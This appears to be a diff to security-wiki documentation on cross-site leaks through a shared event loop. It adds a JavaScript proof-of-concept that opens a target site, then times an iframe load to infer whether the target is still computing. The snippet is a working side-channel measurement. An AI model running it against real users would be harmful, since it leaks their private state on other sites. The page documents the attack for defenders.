@@ -89,7 +89,31 @@ Attackers can make the [event loop busy](https://gist.github.com/terjanq/60b4ae4
 
 1. Navigate the target website in a separate window with `window.open` or inside an iframe (if [Framing Protections](https://TODO) are **not** in place).
 2. Wait for the long computation to start.
-3. Load the target website inside an iframe (regardless of any [Framing Protections](https://TODO)). An attacker can detect if step 1 is still computing by checking if the iframe started loading (onload). Since both navigations occurred within the same context and they are same-origin, they run in the same thread and share the same event loop (they can block each other), as Site Isolation is not enforced.
+3. Load the target website inside an iframe, regardless of any [Framing Protections](https://TODO). An attacker can detect if step 1 is still computing by checking if the iframe started loading (onload). Since both navigations occurred within the same context and they are same-site, they run in the same thread and share the same event loop (they can block each other), as Site Isolation is not enforced.
+
+The example below shows how the measurement can be obtained, using the same technique described in [Cross-Window Timing Attacks](https://TODO) for step 2.
+
+```javascript
+let w = 0, end = 0, begin = 0;
+onmessage=()=>{
+  try{
+    if(w && w.document.cookie){
+      // still same origin
+    }
+    postMessage('','*');
+  }catch(e){
+    begin = performance.now();
+    var x = document.createElement('iframe');
+    x.src = "https://target";
+    document.body.appendChild(x);
+    start = performance.now();
+    x.onload = () => console.log(performance.now() - begin)
+  }
+};
+postMessage('','*');
+w = open('https://target');
+```
+
 
 ## Defense
 
